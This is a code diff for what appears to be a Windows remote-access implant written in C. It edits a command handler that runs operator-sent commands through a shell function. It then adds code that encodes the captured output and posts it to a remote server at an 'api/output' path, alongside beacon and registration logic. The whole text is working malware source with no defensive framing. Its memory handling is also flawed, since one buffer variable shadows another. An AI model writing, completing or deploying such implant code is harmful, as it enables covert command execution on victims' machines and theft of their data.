@@ -5,6 +5,8 @@
 
 #define patch_length 2
 
+void process_command();
+
 struct {
     CHAR*   address;
     INT     port;
@@ -113,49 +115,6 @@ void package(CHAR* buffer) {
     }
 }
 
-void process_command(CHAR* command, CHAR* input) {
-    CHAR* output = NULL;
-    INT hex_command = atoi(command);
-
-    log_debug("Command: %s", command);
-    log_debug("Hex value: 0x%x", hex_command);
-    log_debug("Input: %s", input);
-
-    CHAR* command_input = strdup(command); // Must be freed
-    strcat(command_input, " "); 
-    strcat(command_input, input); 
-    if ((*patch_list_pointers[0])(command_input, &output)) { // index 0 of patch list is shell function
-        log_info("Output:%s", output);
-        goto send_output;
-    }
-
-    goto send_output;
-    send_output:
-        /**
-         * Output data structure:
-         * 
-         *      Status      4       (INT)
-         *          0: Negotiate
-         *          1: Register
-         *          2: Beacon
-         *          3: Output
-         *      Key         16      (CHAR*)
-         *      Output      256     (CHAR*)
-        */
-
-        if (output != NULL) {
-            goto cleanup;
-        } else {
-            goto cleanup;
-        }
-    cleanup:
-        log_debug("Attempting to clean memory");
-        free(input);
-        free(output);
-        free(command_input);
-        return;
-}
-
 void http_request() {
     HINTERNET h_internet;
     HINTERNET h_connect;
@@ -190,6 +149,10 @@ void http_request() {
         }
 
         log_debug("Request sent");
+
+        if (strcmp(transport.path, "api/output") == 0) {
+            return;
+        }
 
         BOOL available = InternetQueryDataAvailable(h_request, &available_size, 0, 0);
         if (available == FALSE || available_size == 0) {
@@ -260,6 +223,67 @@ void http_request() {
         InternetCloseHandle(h_internet);
         InternetCloseHandle(h_connect);
         InternetCloseHandle(h_request);
+        return;
+}
+
+void process_command(CHAR* command, CHAR* input) {
+    CHAR* output = NULL;
+    INT hex_command = atoi(command);
+    CHAR* data_pointer = NULL;
+
+    log_debug("Command: %s", command);
+    log_debug("Hex value: 0x%x", hex_command);
+    log_debug("Input: %s", input);
+
+    CHAR* command_input = strdup(command); // Must be freed
+    strcat(command_input, " "); 
+    strcat(command_input, input); 
+    if ((*patch_list_pointers[0])(command_input, &output)) { // index 0 of patch list is shell function
+        log_info("Output:%s", output);
+        goto send_output;
+    }
+
+    goto send_output;
+    send_output:
+        /**
+         * Output data structure:
+         * 
+         *      Status      4       (INT)
+         *          0: Negotiate
+         *          1: Register
+         *          2: Beacon
+         *          3: Output
+         *      Key         16      (CHAR*)
+         *      Output      256     (CHAR*)
+        */
+
+        if (output != NULL) {
+            data.format = "%s";
+            transport.path = "api/output";
+
+            DWORD pointer_length = strlen(data.format) + strlen(output);
+            CHAR* data_pointer = malloc(pointer_length);
+            sprintf_s(data_pointer, pointer_length, data.format, output);
+
+            DWORD data_length = pointer_length - strlen(data.format);
+            CHAR* buffer = encode(data_pointer, data_length);
+            package(buffer);
+
+
+            log_info("Buffer: %s", buffer); 
+
+            http_request();
+        } 
+
+        goto cleanup;
+
+    cleanup:
+        log_debug("Attempting to clean memory");
+        free(input);
+        free(output);
+        free(command_input);
+        free(data_pointer);
+        return;
 }
 
 void agent_beacon() {
